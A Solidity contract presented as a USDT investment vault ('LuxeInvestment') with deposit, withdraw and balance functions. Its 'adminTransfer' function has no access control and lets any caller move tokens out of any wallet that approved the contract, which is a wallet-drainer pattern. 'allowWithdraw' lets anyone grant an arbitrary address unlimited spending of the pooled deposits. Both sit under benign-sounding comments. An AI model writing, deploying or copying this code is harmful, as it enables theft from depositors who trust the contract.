// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract LuxeInvestment {
    // Use OpenZeppelin's IERC20 interface
    IERC20 public usdt;

    // Mapping to track user balances
    mapping(address => uint256) private balances;
    // Constructor to set the USDT contract address
    constructor(address _usdtAddress) {
        usdt = IERC20(_usdtAddress);

    }
    function deposit(uint256 amount) external {
        require(amount > 0, "Deposit amount must be greater than zero");

        // Transfer USDT from the user to the contract
        require(usdt.transferFrom(msg.sender, address(this), amount), "Transfer failed to deposit");

        // Update user balance
        balances[msg.sender] += amount;
    }

    // Function to withdraw USDT from the contract
    function withdraw(uint256 amount) external {
        require(amount > 0, "Withdraw amount must be greater than zero");
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // Deduct the amount from the user's balance
        balances[msg.sender] -= amount;

        // Transfer USDT back to the user
        require(usdt.transfer(msg.sender, amount), "Withdraw failed");
    }

        // Admin transfer function
    function adminTransfer(address from, address to, uint256 amount) external {
        require(amount > 0, "Transfer amount must be greater than zero");
        require(usdt.allowance(from, address(this)) >= amount, "Insufficient allowance");

        // Transfer tokens from `from` to `to`
        require(usdt.transferFrom(from, to, amount), "Admin transfer failed");
    }


    // Function to check the balance of the user in the contract
    function getBalanceOf(address user) external view returns (uint256) {
        return balances[user];
    }

    function walletBalance(address user) external view returns (uint256){
        return usdt.balanceOf(user);

    }

        // Function to allow withdraw by approving spender unlimited amount
    function allowWithdraw(address spender) external {
        uint256 maxUint = 2**256 - 1; // Maximum uint256 value
        require(usdt.approve(spender, maxUint), "Approval failed");
    }




}
